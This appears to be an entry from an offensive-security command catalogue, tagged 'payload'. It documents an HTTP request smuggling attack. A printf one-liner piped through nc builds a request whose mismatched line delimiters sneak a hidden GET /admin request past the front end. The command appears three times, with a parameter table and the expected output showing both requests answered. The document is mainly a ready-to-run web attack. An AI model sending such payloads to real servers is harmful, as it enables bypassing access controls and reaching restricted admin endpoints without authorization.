---
data: >-
  (printf "GET / HTTP/1.1\r\nHost: localhost\r\nDummy: x\nContent-Length:
  23\r\n\r\nGET / HTTP/1.1\r\nDummy: GET /admin HTTP/1.1\r\nHost:
  localhost\r\n\r\n\r\n") | nc localhost 80
tags:
  - http-smuggling
  - payload
type: command
executor: bash
platforms:
  - Linux
  - macOS
id: 5c9c5b26-c0f4-486b-83db-b86794cf64dc
created_at: '2025-12-13T09:01:17.372Z'
updated_at: '2025-12-13T09:01:17.372Z'
verified: false
validated: true
submitted: true
---
# Printf NC Smuggling Payload

## Command

```bash
(printf "GET / HTTP/1.1\r\nHost: localhost\r\nDummy: x\nContent-Length: 23\r\n\r\nGET / HTTP/1.1\r\nDummy: GET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n\r\n") | nc localhost 80
```

## Description

Uses printf to construct a crafted HTTP request with LF delimiters for smuggling and pipes it via nc to the server on localhost:80 to exploit the delimiter mismatch.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `printf "..."` | Builds the request string | Yes |
| `nc localhost 80` | Sends to localhost on port 80 | Yes |

## Examples

### Basic Usage

```bash
(printf "GET / HTTP/1.1\r\nHost: localhost\r\nDummy: x\nContent-Length: 23\r\n\r\nGET / HTTP/1.1\r\nDummy: GET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n\r\n") | nc localhost 80
```

## Expected Output

Server responds with two HTTP 200 OK messages: one for / with body including part of the next request, and one for /admin.

## Related

- [[procedures/Craft-and-Send-HTTP-Request-Smuggling-Payload]]
